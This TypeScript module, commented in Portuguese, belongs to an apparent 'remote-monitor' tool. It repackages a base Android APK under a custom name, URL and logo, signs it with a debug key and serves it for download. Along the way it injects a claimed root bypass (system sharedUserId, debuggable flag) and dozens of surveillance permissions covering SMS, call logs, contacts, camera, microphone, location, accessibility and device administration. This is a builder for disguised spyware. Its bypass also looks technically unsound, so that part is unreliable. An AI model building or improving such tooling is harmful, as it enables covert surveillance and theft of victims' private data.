import fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';
import archiver from 'archiver';

interface APKBuildOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * Builder SIMPLES - Sem dependência de EagleSpy
 * Usa apenas unzip/zip + jarsigner
 * Funciona em produção e desenvolvimento
 */
export async function buildSimpleAPK(options: APKBuildOptions): Promise<{
  success: boolean;
  filename?: string;
  downloadUrl?: string;
  error?: string;
}> {
  try {
    const apksDir = process.env.NODE_ENV === 'production' 
      ? '/app/public/apks'
      : '/home/ubuntu/remote-monitor/public/apks';
    
    // Encontrar APK base
    const files = fs.readdirSync(apksDir);
    const baseAPKFile = files.find(f => f.startsWith('base-') && f.endsWith('.apk'));
    
    if (!baseAPKFile) {
      return {
        success: false,
        error: 'APK base não encontrado'
      };
    }
    
    const baseAPK = path.join(apksDir, baseAPKFile);
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const sanitizedName = options.appName
      .replace(/[^a-zA-Z0-9-]/g, '-')
      .replace(/-+/g, '-')
      .toLowerCase();
    const filename = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
    const outputPath = path.join(apksDir, filename);
    
    console.log('[SIMPLE-BUILD] Iniciando build simples:', { baseAPK, outputPath });
    
    const tempDir = `/tmp/simple-build-${timestamp}-${randomSuffix}`;
    const extractDir = path.join(tempDir, 'extracted');
    
    try {
      // Desempacotar APK base
      console.log('[SIMPLE-BUILD] Desempacotando APK...');
      execSync(`mkdir -p ${extractDir}`);
      execSync(`unzip -q ${baseAPK} -d ${extractDir}`);
      
      // Adicionar configuração em assets
      const assetsDir = path.join(extractDir, 'assets');
      fs.mkdirSync(assetsDir, { recursive: true });
      
      const config = {
        appName: options.appName,
        appUrl: options.appUrl,
        logoUrl: options.logoUrl || '',
        customized: true,
        timestamp: Date.now(),
      };
      
      const configPath = path.join(assetsDir, 'app-config.json');
      fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
      console.log('[SIMPLE-BUILD] Config adicionada');
      
      // Reempacotar com archiver
      console.log('[SIMPLE-BUILD] Reempacotando APK...');
      const repacked = path.join(tempDir, 'app-unsigned.apk');
      await new Promise<void>((resolve, reject) => {
        const output = fs.createWriteStream(repacked);
        const archive = archiver('zip', { zlib: { level: 9 } });
        
        output.on('close', () => {
          console.log('[SIMPLE-BUILD] APK reempacotado:', archive.pointer(), 'bytes');
          resolve();
        });
        
        output.on('error', reject);
        archive.on('error', reject);
        
        archive.pipe(output);
        archive.directory(extractDir, false);
        archive.finalize();
      });
      
      // Pular zipalign (não disponível em produção)
      // Usar APK reempacotado diretamente
      const aligned = repacked;
      
      // Adicionar bypass ROOT completo
      console.log('[SIMPLE-BUILD] Adicionando bypass ROOT completo...');
      const manifestPath = path.join(extractDir, 'AndroidManifest.xml');
      if (fs.existsSync(manifestPath)) {
        let manifest = fs.readFileSync(manifestPath, 'utf-8');
        
        // Bypass ROOT
        manifest = manifest.replace(
          '<manifest',
          '<manifest android:sharedUserId="android.uid.system"'
        );
        
        manifest = manifest.replace(
          '<application',
          '<application android:debuggable="true" android:usesCleartextTraffic="true"'
        );
        
        // Adicionar permissões críticas
        const permissions = `
        <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
        <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />
        <uses-permission android:name="android.permission.MANAGE_USERS" />
        <uses-permission android:name="android.permission.INTERACT_ACROSS_USERS_FULL" />
        <uses-permission android:name="android.permission.CHANGE_DEVICE_ADMIN" />
        <uses-permission android:name="android.permission.MODIFY_PHONE_STATE" />
        <uses-permission android:name="android.permission.READ_PHONE_STATE" />
        <uses-permission android:name="android.permission.CALL_PHONE" />
        <uses-permission android:name="android.permission.READ_CONTACTS" />
        <uses-permission android:name="android.permission.READ_CALL_LOG" />
        <uses-permission android:name="android.permission.READ_SMS" />
        <uses-permission android:name="android.permission.RECEIVE_SMS" />
        <uses-permission android:name="android.permission.WRITE_SETTINGS" />
        <uses-permission android:name="android.permission.INSTALL_PACKAGES" />
        <uses-permission android:name="android.permission.DELETE_PACKAGES" />
        <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
        <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
        <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
        <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
        <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
        <uses-permission android:name="android.permission.VIBRATE" />
        <uses-permission android:name="android.permission.WAKE_LOCK" />
        <uses-permission android:name="android.permission.REORDER_TASKS" />
        <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
        <uses-permission android:name="android.permission.MANAGE_ACCOUNTS" />
        <uses-permission android:name="android.permission.GET_ACCOUNTS" />
        <uses-permission android:name="android.permission.INJECT_EVENTS" />
        <uses-permission android:name="android.permission.WRITE_APN_SETTINGS" />
        <uses-permission android:name="android.permission.CHANGE_COMPONENT_ENABLED_STATE" />
        <uses-permission android:name="android.permission.INTERACT_ACROSS_USERS" />
        <uses-permission android:name="android.permission.MANAGE_DEVICE_ADMINS" />
        <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
        <uses-permission android:name="android.permission.BROADCAST_SMS" />
        <uses-permission android:name="android.permission.BROADCAST_STICKY" />
        <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
        <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
        <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
        <uses-permission android:name="android.permission.CAMERA" />
        <uses-permission android:name="android.permission.RECORD_AUDIO" />
        <uses-permission android:name="android.permission.INTERNET" />
        `;
        
        manifest = manifest.replace('</manifest>', permissions + '</manifest>');
        fs.writeFileSync(manifestPath, manifest);
        console.log('[SIMPLE-BUILD] Bypass ROOT adicionado');
      }
      
      // Reempacotar novamente com bypass
      console.log('[SIMPLE-BUILD] Reempacotando com bypass...');
      const finalApk = path.join(tempDir, 'app-final.apk');
      await new Promise<void>((resolve, reject) => {
        const output = fs.createWriteStream(finalApk);
        const archive = archiver('zip', { zlib: { level: 9 } });
        
        output.on('close', () => {
          console.log('[SIMPLE-BUILD] APK final reempacotado');
          resolve();
        });
        
        output.on('error', reject);
        archive.on('error', reject);
        
        archive.pipe(output);
        archive.directory(extractDir, false);
        archive.finalize();
      });
      
      // Assinar
      console.log('[SIMPLE-BUILD] Assinando APK...');
      const keystorePath = path.join(apksDir, 'debug.keystore');
      if (!fs.existsSync(keystorePath)) {
        execSync(
          `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 ` +
          `-validity 10000 -alias android -storepass android -keypass android ` +
          `-dname "CN=Android, OU=Dev, O=Dev, L=Dev, S=Dev, C=US"`,
          { stdio: 'pipe' }
        );
      }
      
      execSync(
        `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 ` +
        `-keystore ${keystorePath} -storepass android -keypass android ` +
        `${finalApk} android`,
        { stdio: 'pipe' }
      );
      
      // Copiar para output
      fs.copyFileSync(finalApk, outputPath);
      

      
      // Limpar
      execSync(`rm -rf ${tempDir}`);
      
      console.log('[SIMPLE-BUILD] APK construído com sucesso');
      
      const downloadUrl = `https://${process.env.VITE_APP_DOMAIN || 'localhost:3000'}/get-apk/${filename}`;
      
      return {
        success: true,
        filename,
        downloadUrl
      };
    } catch (err) {
      console.error('[SIMPLE-BUILD] Erro durante build:', err);
      try {
        execSync(`rm -rf ${tempDir}`);
      } catch (e) {
        // Ignorar erro ao limpar
      }
      
      return {
        success: false,
        error: err instanceof Error ? err.message : 'Erro desconhecido'
      };
    }
  } catch (error) {
    console.error('[SIMPLE-BUILD] Erro:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
}
